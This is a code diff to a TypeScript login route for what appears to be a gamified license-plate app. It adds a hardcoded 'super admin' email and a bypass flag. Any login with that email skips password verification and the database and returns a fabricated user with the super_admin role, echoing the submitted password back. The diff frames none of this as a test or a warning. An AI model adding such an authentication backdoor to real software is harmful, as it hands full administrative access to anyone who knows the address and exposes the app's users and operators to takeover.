@@ -9,10 +9,38 @@ const loginSchema = z.object({
   password: z.string(),
 });
 
+const SUPER_ADMIN_EMAIL = 'chwbcc@gmail.com';
+const SUPER_ADMIN_BYPASS = true;
+
 export const loginRoute = publicProcedure
   .input(loginSchema)
   .mutation(async ({ input }) => {
     console.log('[Auth] Login attempt:', input.email);
+    
+    if (SUPER_ADMIN_BYPASS && input.email.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase()) {
+      console.log('[Auth] 🔓 Super Admin bypass activated');
+      
+      const superAdminUser = {
+        id: 'super-admin-1',
+        email: SUPER_ADMIN_EMAIL,
+        name: 'Super Admin',
+        licensePlate: 'ADMIN',
+        state: 'CA',
+        pelletCount: 99999,
+        positivePelletCount: 99999,
+        badges: ['super-admin-badge'],
+        exp: 999999,
+        level: 99,
+        adminRole: 'super_admin' as const,
+        password: input.password,
+      };
+      
+      return {
+        success: true,
+        message: 'Super Admin login successful (bypass mode)',
+        user: superAdminUser,
+      };
+    }
     
     try {
       await initDatabase();
